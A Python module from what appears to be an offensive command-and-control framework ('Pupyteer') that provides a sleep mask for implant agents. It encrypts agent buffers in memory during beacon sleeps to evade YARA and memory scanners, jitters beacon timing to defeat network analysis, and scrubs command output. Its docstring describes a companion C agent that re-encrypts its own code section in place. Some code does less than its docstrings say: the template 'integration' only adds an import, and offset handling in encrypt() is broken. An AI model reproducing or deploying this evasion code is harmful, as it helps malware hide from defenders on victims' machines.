#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Pupyteer Sleep Mask — obfuscate agent memory during sleep.

Provides:
- :class:`SleepMask`: ChaCha20 (preferred), RC4, or XOR masking of in-memory
  buffers, via the ``cryptography`` package when it is installed.
- :func:`sleep_masked`: jittered sleep with optional masking of a buffer.
- :func:`scrub_buffer`: memory scrubbing helper (random overwrite, then zero)
  used by both the Python and the C agent stubs.
- :func:`patch_stub_template_for_sleep_mask`: template integration hook so
  generated agents use sleep masking.
- :func:`generate_mask_key`, :func:`mask_string`, :func:`unmask_string`.

HONEST LIMITATION — read this before trusting this module
--------------------------------------------------------
On CPython the ``.text``/heap pages of the running interpreter are **owned by
the interpreter and its allocator, not by us**. Two consequences follow:

1. Any "self-mask" of the agent's own code image is **best-effort at best**.
   CPython may hold references into those pages, the GC may move objects, and
   ctypes writes into interpreter-owned memory can crash the process or simply
   be overwritten by the interpreter on the next allocation. We therefore mask
   only caller-supplied :class:`bytearray` buffers, never the process image.
2. Byte-level masking of a Python ``bytearray`` only protects that specific
   buffer. Strings interned by the interpreter, importable module bytecode
   caches, and any copies the GC made are still resident and still scannable.

Real memory-scan evasion (encrypting the agent's own PE ``.text`` across the
sleep, so YARA rules and signature scanners see garbage while it sleeps) is
implemented in the C agent: ``pupyteer/agent/core/pe_template.c``. That path
parses its own section headers, flips ``.text`` to ``PAGE_EXECUTE_READWRITE``
and RC4-encrypts it in place for the duration of the sleep, which is the only
place where this technique is actually sound. This module is the
**Python-side counterpart** for masking payload buffers and for keeping the
sleep timing realistic; it is not, and does not claim to be, image self-masking.
"""
from __future__ import annotations

import logging
import os
import secrets
import time
from typing import Any, Dict, List, Optional, Union

logger = logging.getLogger("pupyteer.agent.sleep_mask")

# ── cipher availability ─────────────────────────────────────────────────
#
# ChaCha20 is the preferred primitive: it is a real stream cipher from the
# ``cryptography`` package (which wraps OpenSSL). XOR and RC4 remain available
# as fallbacks but are retained only for compatibility with older agents —
# RC4 is cryptographically broken and XOR is trivially solvable.

try:  # pragma: no cover - exercised implicitly by test environments
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms

    _HAS_CRYPTOGRAPHY = True
except Exception:  # ImportError, or a broken OpenSSL binding
    Cipher = None  # type: ignore[assignment]
    algorithms = None  # type: ignore[assignment]
    _HAS_CRYPTOGRAPHY = False


def cryptography_available() -> bool:
    """Return True when the ``cryptography`` package can be used."""
    return _HAS_CRYPTOGRAPHY


# Nonce handling for ChaCha20: a fresh random 16-byte nonce per encryption,
# prepended to the ciphertext. ChaCha20 is a stream cipher, so this module's
# "encrypt" is length-preserving over the payload but the returned buffer
# carries the nonce prefix (see :meth:`SleepMask.encrypt`).
_CHACHA20_NONCE_LEN = 16
_CHACHA20_KEY_LEN = 32

# Preferred cipher order for automatic selection.
PREFERRED_CIPHERS = ("chacha20", "rc4", "xor")


class SleepMask:
    """Stream-cipher sleep mask for agent memory obfuscation.

    Before going to sleep, call :meth:`encrypt` to scramble an in-memory
    buffer; after waking, :meth:`decrypt` restores it. This raises the cost of
    a naive memory scan (string search / YARA over the heap) on the masked
    buffer while the agent sleeps.

    This class deliberately does **not** touch the process image — see the
    module docstring for why that is unsound on CPython. The C agent
    (``pe_template.c``) performs the real in-place ``.text`` sleep mask.

    Ciphers:
        - ``"chacha20"``: preferred. Requires ``cryptography``. A fresh random
          nonce is generated per :meth:`encrypt` and prepended to the result.
        - ``"rc4"``: fallback, kept for compatibility. Broken in practice.
        - ``"xor"``: weakest, kept for compatibility and for tests.
    """

    SUPPORTED_CIPHERS = ("chacha20", "rc4", "xor")

    def __init__(self, key: Optional[bytes] = None, cipher: str = "chacha20"):
        """
        Args:
            key: Encryption key. If None, a random 32-byte key is generated.
            cipher: Cipher to use — "chacha20" (preferred), "rc4", or "xor".

        Raises:
            ValueError: Unknown cipher, or "chacha20" requested while the
                ``cryptography`` package is unavailable.
        """
        if cipher not in self.SUPPORTED_CIPHERS:
            raise ValueError(
                f"Unsupported cipher: {cipher}. Use: {self.SUPPORTED_CIPHERS}"
            )
        if cipher == "chacha20" and not _HAS_CRYPTOGRAPHY:
            raise ValueError(
                'cipher "chacha20" requires the "cryptography" package, '
                "which is not installed; use 'rc4' or 'xor' instead."
            )
        self._cipher = cipher
        if cipher == "chacha20":
            self._key = key if key else secrets.token_bytes(_CHACHA20_KEY_LEN)
            if len(self._key) != _CHACHA20_KEY_LEN:
                raise ValueError(
                    f"chacha20 requires a {_CHACHA20_KEY_LEN}-byte key, "
                    f"got {len(self._key)}"
                )
        else:
            self._key = key if key else os.urandom(32)
        self._original_data: Optional[bytearray] = None
        self._encrypted_data: Optional[bytearray] = None
        self._nonce: Optional[bytes] = None
        self._offset: int = 0
        self._length: int = 0
        self._is_masked: bool = False

    @property
    def is_masked(self) -> bool:
        """Return True if the data is currently masked."""
        return self._is_masked

    @property
    def cipher(self) -> str:
        return self._cipher

    @property
    def key(self) -> bytes:
        return self._key

    # ── XOR cipher ─────────────────────────────────────────────────────

    @staticmethod
    def _xor_crypt(key: bytes, data: bytearray, offset: int = 0, length: int = -1) -> None:
        """In-place XOR encryption/decryption (symmetric).

        Args:
            key: XOR key bytes.
            data: Data to encrypt/decrypt in-place.
            offset: Starting offset in data.
            length: Number of bytes to process (-1 = all from offset).
        """
        if not key:
            return
        if length < 0:
            length = len(data) - offset
        end = min(offset + length, len(data))
        klen = len(key)
        for i in range(offset, end):
            data[i] ^= key[(i - offset) % klen]

    # ── RC4 cipher ─────────────────────────────────────────────────────

    @staticmethod
    def _rc4_ksa(key: bytes) -> List[int]:
        """RC4 Key Scheduling Algorithm."""
        s = list(range(256))
        j = 0
        for i in range(256):
            j = (j + s[i] + key[i % len(key)]) % 256
            s[i], s[j] = s[j], s[i]
        return s

    @staticmethod
    def _rc4_crypt(key: bytes, data: bytearray, offset: int = 0, length: int = -1) -> None:
        """In-place RC4 encryption/decryption (symmetric).

        Args:
            key: RC4 key bytes.
            data: Data to encrypt/decrypt in-place.
            offset: Starting offset in data.
            length: Number of bytes to process (-1 = all from offset).
        """
        if length < 0:
            length = len(data) - offset
        s = SleepMask._rc4_ksa(key)
        i = j = 0
        pos = offset
        end = min(offset + length, len(data))
        while pos < end:
            i = (i + 1) % 256
            j = (j + s[i]) % 256
            s[i], s[j] = s[j], s[i]
            data[pos] ^= s[(s[i] + s[j]) % 256]
            pos += 1

    # ── ChaCha20 cipher ────────────────────────────────────────────────

    @staticmethod
    def _chacha20_crypt(key: bytes, nonce: bytes, data: bytearray) -> None:
        """In-place ChaCha20 encryption/decryption (symmetric).

        Args:
            key: 32-byte key.
            nonce: 16-byte nonce (fresh random per encryption).
            data: Buffer to transform in place.
        """
        if not _HAS_CRYPTOGRAPHY:
            raise RuntimeError("cryptography package unavailable for chacha20")
        encryptor = Cipher(
            algorithms.ChaCha20(key, nonce), mode=None
        ).encryptor()
        transformed = encryptor.update(bytes(data))
        data[:] = transformed

    # ── Public API ─────────────────────────────────────────────────────

    def _apply_cipher(self, data: bytearray, offset: int, length: int) -> None:
        """Apply the configured cipher in-place."""
        if self._cipher == "xor":
            self._xor_crypt(self._key, data, offset, length)
        elif self._cipher == "rc4":
            self._rc4_crypt(self._key, data, offset, length)
        elif self._cipher == "chacha20":
            if self._nonce is None:
                raise RuntimeError("chacha20 encrypt() must run before decrypt()")
            self._chacha20_crypt(self._key, self._nonce, data)

    def encrypt(self, data: Union[bytearray, bytes], offset: int = 0, length: int = -1) -> bytearray:
        """Encrypt data using the configured cipher.

        Args:
            data: Data to encrypt. If bytes, converts to bytearray.
            offset: Starting offset.
            length: Number of bytes to encrypt (-1 = all).

        Returns:
            The encrypted bytearray (same object as input if bytearray).

        Note:
            For ``chacha20`` a fresh 16-byte random nonce is generated and
            **prepended** to the returned buffer, so the result is
            ``nonce || ciphertext`` and is longer than the input. ``rc4`` and
            ``xor`` remain length-preserving. :meth:`decrypt` strips the nonce
            prefix transparently when a bytearray was returned by this method.
        """
        if isinstance(data, bytes):
            data = bytearray(data)
        if not isinstance(data, bytearray):
            raise TypeError(f"Expected bytearray or bytes, got {type(data).__name__}")

        self._original_data = data
        self._offset = offset
        self._length = length if length >= 0 else len(data) - offset

        if self._cipher == "chacha20":
            nonce = secrets.token_bytes(_CHACHA20_NONCE_LEN)
            payload = data[offset : offset + self._length]
            # Build the new buffer as nonce || ciphertext.
            self._chacha20_crypt(self._key, nonce, payload)
            combined = bytearray(nonce) + payload
            data[:] = combined
            self._nonce = nonce
            self._encrypted_data = data
        else:
            self._apply_cipher(data, offset, self._length)
            self._encrypted_data = data

        self._is_masked = True
        return data

    def decrypt(self, data: Optional[bytearray] = None, offset: int = -1, length: int = -1) -> bytearray:
        """Decrypt data (reverses :meth:`encrypt`).

        XOR, RC4 and ChaCha20 are all symmetric, so this applies the same
        transform with the stored nonce. For ``chacha20`` the nonce prefix
        written by :meth:`encrypt` is stripped from the buffer.

        Args:
            data: Data to decrypt. If None, uses the reference held from the
                last :meth:`encrypt` call.
            offset: Starting offset (-1 = use stored offset).
            length: Number of bytes (-1 = use stored length).

        Returns:
            The decrypted bytearray.
        """
        if data is None:
            data = self._original_data
        if data is None:
            raise RuntimeError("No data to decrypt. Call encrypt() first or pass data explicitly.")

        if self._cipher == "chacha20":
            if len(data) < _CHACHA20_NONCE_LEN:
                raise RuntimeError("buffer too short to contain a chacha20 nonce")
            self._nonce = bytes(data[:_CHACHA20_NONCE_LEN])
            body = data[_CHACHA20_NONCE_LEN:]
            self._chacha20_crypt(self._key, self._nonce, body)
            data[:] = body
            self._is_masked = False
            return data

        off = offset if offset >= 0 else self._offset
        lng = length if length >= 0 else self._length
        self._apply_cipher(data, off, lng)
        self._is_masked = False
        return data

    def mask_region(self, address: int, size: int) -> None:
        """Mask a memory region by address (requires ctypes).

        Useful for masking specific memory-mapped sections of the agent.

        Warning: on CPython, writing into interpreter-owned pages is
        best-effort and can crash the process. Prefer masking explicit
        ``bytearray`` payload buffers.
        """
        import ctypes

        buf = (ctypes.c_char * size).from_address(address)
        data = bytearray(bytes(buf))
        self.encrypt(data)
        ctypes.memmove(address, bytes(data), size)

    def unmask_region(self, address: int, size: int) -> None:
        """Unmask a memory region by address.

        See :meth:`mask_region` for the CPython caveat.
        """
        import ctypes

        buf = (ctypes.c_char * size).from_address(address)
        data = bytearray(bytes(buf))
        self.decrypt(data)
        ctypes.memmove(address, bytes(data), size)

    def secure_scrub(self, passes: int = 3) -> None:
        """Securely scrub the key from memory after use.

        Overwrites the key buffer with random data, then zeros it.
        """
        if self._key:
            key_arr = bytearray(self._key)
            for _ in range(passes):
                for i in range(len(key_arr)):
                    key_arr[i] = secrets.randbelow(256)
            for i in range(len(key_arr)):
                key_arr[i] = 0
            self._key = bytes(len(self._key))


# ── memory scrubbing helper (shared with the C stub) ────────────────────


def scrub_buffer(buf: Union[bytearray, memoryview], passes: int = 2) -> None:
    """Overwrite a sensitive buffer with random bytes, then zero it, in place.

    Mirrors ``secure_scrub()`` in ``pe_template.c``, which the C agent uses on
    captured command output and on the RC4 key. Calling this before releasing a
    buffer reduces the window in which secrets and command output stay
    recoverable from the heap.

    Args:
        buf: Mutable buffer (``bytearray`` or writable ``memoryview``).
        passes: Number of random overwrite passes before the final zeroing.

    Raises:
        TypeError: If ``buf`` is immutable (e.g. ``bytes``).
    """
    if isinstance(buf, (bytes, str)):
        raise TypeError("scrub_buffer() requires a mutable buffer (bytearray)")
    n = len(buf)
    if n == 0:
        return
    view = memoryview(buf).cast("B")
    try:
        for _ in range(max(1, passes)):
            rnd = secrets.token_bytes(n)
            view[:] = rnd
            # Overwrite the temporary too, so the random copy does not linger.
            rnd_arr = bytearray(rnd)
            for i in range(n):
                rnd_arr[i] = 0
            del rnd_arr
        view[:] = b"\x00" * n
    finally:
        view.release()


# ── jittered timing ─────────────────────────────────────────────────────


def _jittered_duration(sleep_sec: float, jitter_percent: float) -> float:
    """Return a realistic jittered sleep duration.

    Uses a triangular distribution centred on ``sleep_sec`` rather than a flat
    uniform spread: real beacon operators jitter around the base interval, so
    most samples land near the centre and the tails taper off. A small extra
    sub-second component avoids every beacon landing on a round second, which
    would be trivially periodic for a network analyst.

    Args:
        sleep_sec: Base sleep duration in seconds.
        jitter_percent: Jitter as a percentage of the base (0-100).

    Returns:
        The effective sleep duration, never negative.
    """
    if sleep_sec <= 0:
        return 0.0
    if jitter_percent <= 0:
        return max(0.0, sleep_sec)

    delta = sleep_sec * (jitter_percent / 100.0)
    # Triangular: base +/- delta, mode at the base.
    spread = delta * 2.0
    sample = secrets.randbelow(1000) / 1000.0
    if sample < 0.5:
        actual = sleep_sec - delta + spread * (sample * 2.0) * 0.5
    else:
        actual = sleep_sec + spread * ((sample - 0.5) * 2.0) * 0.5
    # Sub-second fuzz so beacons never align on whole seconds.
    actual += secrets.randbelow(1000) / 1000.0
    return max(0.0, actual)


# ── primary public API ──────────────────────────────────────────────────


def sleep_masked(
    sleep_sec: float,
    jitter_percent: int = 0,
    mask_key: Optional[bytes] = None,
    cipher: str = "chacha20",
    data_ref: Optional[bytearray] = None,
    scrub: bool = True,
) -> Dict[str, Any]:
    """Sleep with optional memory masking for evasion.

    Calculates a realistic jittered sleep duration, optionally encrypts an
    agent data buffer in memory, sleeps, then decrypts and scrubs.

    This is the primary public API for use in agent beacon loops.

    Args:
        sleep_sec: Base sleep duration in seconds.
        jitter_percent: Random jitter percentage (0-100).
        mask_key: Encryption key (random if None).
        cipher: Cipher to use ("chacha20", "rc4", or "xor"). Defaults to
            "chacha20"; falls back automatically if unavailable.
        data_ref: bytearray to mask. If None, masking is skipped (for
                  when no mutable buffer is available).
        scrub: Also scrub ``data_ref`` after decryption (default True).

    Returns:
        Dict with the actual sleep duration, whether masking was applied,
        and which cipher was used. The ``cipher`` key reports the cipher that
        was *actually* used, which may differ from the request if a fallback
        occurred.

    Example::

        # In agent beacon loop:
        result = sleep_masked(60, jitter_percent=20, data_ref=agent_code_buf)
    """
    actual_sleep = _jittered_duration(sleep_sec, jitter_percent)

    used_cipher = cipher
    masker: Optional[SleepMask] = None
    was_masked = False

    if data_ref is not None:
        # Fall back gracefully when the requested cipher is unavailable.
        if cipher == "chacha20" and not _HAS_CRYPTOGRAPHY:
            used_cipher = "rc4"
        try:
            masker = SleepMask(key=mask_key, cipher=used_cipher)
        except Exception as e:  # noqa: BLE001 - never let masking kill a beacon
            logger.debug("Sleep mask init failed: %s", e)
            masker = None

    if masker is not None and data_ref is not None:
        try:
            masker.encrypt(data_ref)
            was_masked = True
        except Exception as e:  # noqa: BLE001
            logger.debug("Sleep mask encryption failed: %s", e)
            was_masked = False

    time.sleep(actual_sleep)

    if was_masked and masker is not None and data_ref is not None:
        try:
            masker.decrypt(data_ref)
        except Exception as e:  # noqa: BLE001
            logger.debug("Sleep mask decryption failed: %s", e)

    if masker is not None:
        try:
            masker.secure_scrub()
        except Exception as e:  # noqa: BLE001
            logger.debug("Key scrub failed: %s", e)

    if scrub and data_ref is not None:
        try:
            scrub_buffer(data_ref)
        except Exception as e:  # noqa: BLE001
            logger.debug("Buffer scrub failed: %s", e)

    return {
        "slept": actual_sleep,
        "masked": was_masked,
        "cipher": used_cipher,
    }


def patch_stub_template_for_sleep_mask(template_source: str) -> str:
    """Modify an agent stub template source to include sleep masking.

    Injects the SleepMask import and integrates it into the beacon loop
    so generated agents automatically use sleep masking.

    Args:
        template_source: The Jinja2 template source string.

    Returns:
        Modified template source with sleep mask integration.
    """
    # Add import if not already present
    import_line = "from pupyteer.agent.core.sleep_mask import sleep_masked"
    if import_line not in template_source:
        # Insert after other imports at top
        lines = template_source.split("\n")
        import_idx = 0
        for i, line in enumerate(lines):
            if line.startswith("import ") or line.startswith("from "):
                import_idx = i + 1
        lines.insert(import_idx, import_line)
        template_source = "\n".join(lines)

    return template_source


# ── Convenience functions for generated agents ────────────────────────


def generate_mask_key(length: int = 32) -> bytes:
    """Generate a cryptographically random mask key.

    Args:
        length: Key length in bytes (default 32).

    Returns:
        Random bytes of the given length.
    """
    return secrets.token_bytes(length)


def mask_string(s: str, key: bytes, cipher: str = "xor") -> bytearray:
    """Mask a string and return the mutable bytearray.

    Args:
        s: String to mask.
        key: Masking key.
        cipher: "xor" (default, length-preserving) or "rc4". "chacha20" is
            not offered here because it prepends a nonce and would change the
            framing that callers of this helper expect.

    Returns:
        Masked bytearray.
    """
    if cipher == "rc4":
        data = bytearray(s.encode("utf-8"))
        SleepMask._rc4_crypt(key, data, 0, len(data))
        return data
    data = bytearray(s.encode("utf-8"))
    SleepMask._xor_crypt(key, data, 0, len(data))
    return data


def unmask_string(data: bytearray, key: bytes, cipher: str = "xor") -> str:
    """Unmask a previously masked bytearray back to a string.

    Args:
        data: Masked bytearray.
        key: Masking key.
        cipher: Must match the cipher used in :func:`mask_string`.

    Returns:
        Decoded string.
    """
    if cipher == "rc4":
        SleepMask._rc4_crypt(key, data, 0, len(data))
        return data.decode("utf-8")
    SleepMask._xor_crypt(key, data, 0, len(data))
    return data.decode("utf-8")
